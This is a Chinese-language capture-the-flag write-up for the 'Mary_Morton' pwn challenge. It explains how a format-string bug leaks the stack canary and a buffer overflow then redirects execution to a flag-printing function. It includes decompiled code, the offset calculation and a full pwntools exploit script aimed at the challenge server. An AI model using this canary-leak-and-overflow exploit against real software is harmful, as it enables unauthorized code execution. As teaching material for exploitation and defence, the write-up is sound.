# Mary_Morton

题目来源：https://adworld.xctf.org.cn/task/

这道题是一个漏洞组合的题目，也是我第一次遇到类似的问题，通过格式化字符串漏洞暴露栈中 canary 的值，随后通过缓冲区溢出漏洞获取 flag。

先不看源代码，先看一下保护机制：

```
    Arch:     amd64-64-little                                              
    RELRO:    Partial RELRO                                            
    Stack:    Canary found                                               
    NX:       NX enabled                                                   
    PIE:      No PIE (0x400000)   
```

然后看一下源代码：

```C
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  int v3; // [rsp+24h] [rbp-Ch]
  unsigned __int64 v4; // [rsp+28h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  sub_4009FF();
  puts("Welcome to the battle ! ");
  puts("[Great Fairy] level pwned ");
  puts("Select your weapon ");
  while ( 1 )
  {
    while ( 1 )
    {
      sub_4009DA();
      __isoc99_scanf("%d", &v3);
      if ( v3 != 2 )
        break;
      sub_4008EB();
    }
    if ( v3 == 3 )
    {
      puts("Bye ");
      exit(0);
    }
    if ( v3 == 1 )
      sub_400960();
    else
      puts("Wrong!");
  }
}
```

从这里还看不到什么问题，不过在 sub_4009DA 中提示，这里会给你提供两个漏洞代码，一个是格式化字符串漏洞，还有就是缓冲区溢出漏洞。它们分别对应函数 sub_4008EB 和 sub_400960:

```C
unsigned __int64 sub_4008EB()
{
  char buf; // [rsp+0h] [rbp-90h]
  unsigned __int64 v2; // [rsp+88h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  memset(&buf, 0, 0x80uLL);
  read(0, &buf, 0x7FuLL);
  printf(&buf, &buf);
  return __readfsqword(0x28u) ^ v2;
}

unsigned __int64 sub_400960()
{
  char buf; // [rsp+0h] [rbp-90h]
  unsigned __int64 v2; // [rsp+88h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  memset(&buf, 0, 0x80uLL);
  read(0, &buf, 0x100uLL);
  printf("-> %s\n", &buf);
  return __readfsqword(0x28u) ^ v2;
}
```

因为在之前的安全性分析中发现，栈中是存在 canary 的，所以直接利用缓冲区溢出是无法成功的。因此这里所要用到的就是 canary 的泄露，而泄露的方法就是使用格式化字符串漏洞。

> 这里对 canary 要有一个初步的了解。在栈防护中，canary 算是比较简单并且比较久远的一种方法。在程序运行的时候会先选定一个每一次都不同的随机数并且预存在一个地方(32 位是 gs:0x14，64 位是 fs:0x28)，然后在每一次函数调用的时候，一般会插入在老 ebp 后面。
>
> 当我们从调用中返回时，系统会检测 canary 的值有没有被修改。当我们用普通的缓冲区溢出攻击时会覆盖掉 canary 值从而会被检测出攻击，所以使用一般的攻击手段不是特别容易绕过 canary 防护。

那么在这道题中只要想办法直到 canary 的值，在 32 位中是一个 4 字节的数据，在 64 位中是一个 8 字节数据，并且因为在老 ebp 下。现在需要的是计算 canary 的位置：

这道题中先借助格式化漏洞，可以知道对于 printf 而言参数的相对位置：

```
AAAA.%x.%x.%x.%x.%x.%x.%x.%x.%x
```

会发现 AAAA 出现在第 6 个位置，这个位置就是 buf 的开始位置，而前面的数据可能是一些冗余数据，被看作了 printf 中压入的参数(目前我是这么理解的)。那么根据栈中给它分配了 0x90 的大小，可以计算出对于 printf 而言 canary 的偏移是 23。

这样我们就能通过 printf("%23$p") 来暴露 canary 从而在下面的溢出中使用到该 canary 了。

```python
from pwn import *                                                         
import time                                                                                                                                              
context(arch="amd64", os ="linux")                                                      conn = remote('220.249.52.133', 37756)                                   
print conn.recvuntil('battle ')                                          
print conn.recvuntil('battle ')                               
conn.sendline('2')                                     
conn.sendline('%23$lld')                                              
print conn.recv()                                                       
canary =  int(conn.recv())                                              
print canary                                                
conn.sendline('1')                                                    
str1 = 'a' * 0x88 + p64(canary) + 'a' * 0x8 + p64(0x004008DA)           
print conn.recvuntil('battle ')                              
conn.sendline(str1)                                                       
print conn.recv()                                                          
print conn.recv()                                                          
print conn.recv()
```

